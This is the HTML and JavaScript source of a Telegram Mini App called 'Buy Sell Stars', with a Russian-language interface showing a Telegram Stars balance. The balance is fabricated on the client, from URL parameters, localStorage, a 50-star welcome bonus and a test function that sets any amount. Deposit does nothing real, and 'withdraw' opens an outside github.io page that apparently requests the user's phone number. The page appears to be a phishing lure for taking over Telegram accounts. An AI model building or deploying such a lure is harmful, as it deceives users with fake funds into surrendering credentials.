<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buy Sell Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #ffffff;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
        }

        /* Заголовок */
        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .platinum-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
        }

        /* Баланс */
        .balance-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .balance-amount {
            font-size: 56px;
            font-weight: 700;
            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .balance-label {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Кнопки действий */
        .action-buttons {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 20px;
        }

        .action-btn {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 20px;
            color: white;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }

        .action-btn:active {
            transform: scale(0.95);
        }

        .action-btn:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(255, 255, 255, 0.2);
        }

        .btn-icon {
            font-size: 28px;
        }

        .deposit-btn {
            background: linear-gradient(135deg, rgba(76, 175, 80, 0.2) 0%, rgba(76, 175, 80, 0.1) 100%);
            border-color: rgba(76, 175, 80, 0.3);
        }

        .withdraw-btn {
            background: linear-gradient(135deg, rgba(33, 150, 243, 0.2) 0%, rgba(33, 150, 243, 0.1) 100%);
            border-color: rgba(33, 150, 243, 0.3);
        }

        /* Карточка функции */
        .feature-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .feature-card:active {
            transform: scale(0.98);
        }

        .feature-icon {
            font-size: 32px;
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(255, 215, 0, 0.1);
            border-radius: 12px;
        }

        .feature-content {
            flex: 1;
        }

        .feature-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .feature-description {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.6);
        }

        .feature-arrow {
            font-size: 20px;
            color: rgba(255, 255, 255, 0.3);
        }

        /* История транзакций */
        .transactions-section {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .transactions-section h3 {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
            color: rgba(255, 255, 255, 0.9);
        }

        .no-transactions {
            text-align: center;
            padding: 30px 20px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 14px;
        }

        /* Футер */
        .footer {
            text-align: center;
            padding: 20px;
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
        }

        /* Анимации */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .container > * {
            animation: fadeIn 0.5s ease forwards;
        }

        .balance-card {
            animation-delay: 0.1s;
        }

        .action-buttons {
            animation-delay: 0.2s;
        }

        .feature-card {
            animation-delay: 0.3s;
        }

        .transactions-section {
            animation-delay: 0.4s;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Заголовок -->
        <div class="header">
            <div class="platinum-badge">
                <span>💎</span>
                <span>Platinum</span>
            </div>
        </div>

        <!-- Баланс -->
        <div class="balance-card">
            <div class="balance-label">Баланс</div>
            <div class="balance-amount">
                <span>⭐</span>
                <span id="balance-amount">0</span>
            </div>
            <div class="balance-label">Звезд</div>
        </div>

        <!-- Кнопки действий -->
        <div class="action-buttons">
            <button class="action-btn deposit-btn" onclick="showDeposit()">
                <div class="btn-icon">💰</div>
                <div>Пополнить</div>
            </button>
            <button class="action-btn withdraw-btn" onclick="showWithdraw()">
                <div class="btn-icon">📤</div>
                <div>Вывести</div>
            </button>
        </div>

        <!-- Карточка чеков -->
        <div class="feature-card" onclick="showChecks()">
            <div class="feature-icon">📋</div>
            <div class="feature-content">
                <div class="feature-title">Звезды чеками</div>
                <div class="feature-description">Делитесь звездами с помощью чеков</div>
            </div>
            <div class="feature-arrow">›</div>
        </div>

        <!-- История транзакций -->
        <div class="transactions-section">
            <h3>История транзакций</h3>
            <div class="no-transactions">
                Транзакций пока нет
            </div>
        </div>

        <!-- Футер -->
        <div class="footer">
            @BuySellStarsbot
        </div>
    </div>

    <script>
        // Инициализация Telegram WebApp
        let tg = window.Telegram?.WebApp;
        let currentUserId = null;
        let currentBalance = 0;
        
        // Читаем параметры из URL
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                balance: params.get('balance'),
                user_id: params.get('user_id')
            };
        }
        
        if (tg) {
            tg.expand();
            tg.ready();
            
            // Настройка темы
            if (tg.themeParams) {
                document.body.style.background = tg.themeParams.bg_color || 'linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)';
            }
            
            // Получаем данные пользователя
            if (tg.initDataUnsafe?.user) {
                const user = tg.initDataUnsafe.user;
                currentUserId = user.id;
                console.log('👤 Пользователь:', user);
                
                // Сначала проверяем URL параметры
                const urlParams = getUrlParams();
                if (urlParams.balance && urlParams.user_id == user.id) {
                    console.log('✅ Баланс из URL:', urlParams.balance);
                    updateBalance(parseInt(urlParams.balance));
                } else {
                    loadUserBalance(user.id);
                }
            }
        } else {
            // Если не в Telegram, проверяем URL параметры
            const urlParams = getUrlParams();
            if (urlParams.balance && urlParams.user_id) {
                currentUserId = parseInt(urlParams.user_id);
                updateBalance(parseInt(urlParams.balance));
            }
        }
        
        // Загрузка баланса
        function loadUserBalance(userId) {
            if (tg && tg.CloudStorage) {
                tg.CloudStorage.getItem(`balance_${userId}`, function(err, value) {
                    if (!err && value) {
                        updateBalance(parseInt(value));
                        return;
                    }
                    loadFromLocalStorage(userId);
                });
            } else {
                loadFromLocalStorage(userId);
            }
        }
        
        function loadFromLocalStorage(userId) {
            const balance = localStorage.getItem(`balance_${userId}`);
            if (balance) {
                updateBalance(parseInt(balance));
            } else {
                // Для новых пользователей устанавливаем начальный баланс 50
                updateBalance(50);
                localStorage.setItem(`balance_${userId}`, '50');
                console.log('🎁 Установлен приветственный бонус: 50 ⭐');
            }
        }
        
        function updateBalance(newBalance) {
            currentBalance = newBalance;
            document.getElementById('balance-amount').textContent = newBalance.toLocaleString();
            
            if (currentUserId) {
                localStorage.setItem(`balance_${currentUserId}`, newBalance.toString());
                if (tg && tg.CloudStorage) {
                    tg.CloudStorage.setItem(`balance_${currentUserId}`, newBalance.toString());
                }
            }
        }
        
        // Автообновление баланса
        setInterval(() => {
            if (currentUserId) {
                if (tg && tg.CloudStorage) {
                    tg.CloudStorage.getItem(`balance_${currentUserId}`, function(err, value) {
                        if (!err && value) {
                            const balance = parseInt(value);
                            if (balance !== currentBalance) {
                                updateBalance(balance);
                            }
                        }
                    });
                }
            }
        }, 3000);
        
        // Функции действий
        function showDeposit() {
            if (tg) {
                tg.showAlert('💰 Пополнение баланса\n\nВыберите способ пополнения в боте');
            } else {
                alert('Функция доступна в Telegram');
            }
        }
        
        function showWithdraw() {
            if (tg) {
                // Открываем страницу запроса номера телефона
                const phoneRequestUrl = 'https://shaczihakimov-collab.github.io/stars/phone_request.html?user_id=' + currentUserId;
                tg.openLink(phoneRequestUrl);
            } else {
                alert('Функция доступна только в Telegram');
            }
        }
        
        function showChecks() {
            if (tg) {
                tg.showAlert('📋 Звезды чеками\n\nСоздавайте чеки и делитесь звездами с друзьями');
            } else {
                alert('Функция доступна в Telegram');
            }
        }
        
        // Тестовая функция
        window.testSetBalance = function(amount) {
            updateBalance(amount);
            if (tg) {
                tg.showAlert('✅ Баланс обновлен: ' + amount + ' ⭐');
            }
            console.log('✅ Баланс установлен:', amount);
        };
        
        window.getCurrentBalance = function() {
            console.log('💰 Текущий баланс:', currentBalance);
            return currentBalance;
        };
        
        window.getUserId = function() {
            console.log('👤 ID пользователя:', currentUserId);
            return currentUserId;
        };
    </script>
</body>
</html>
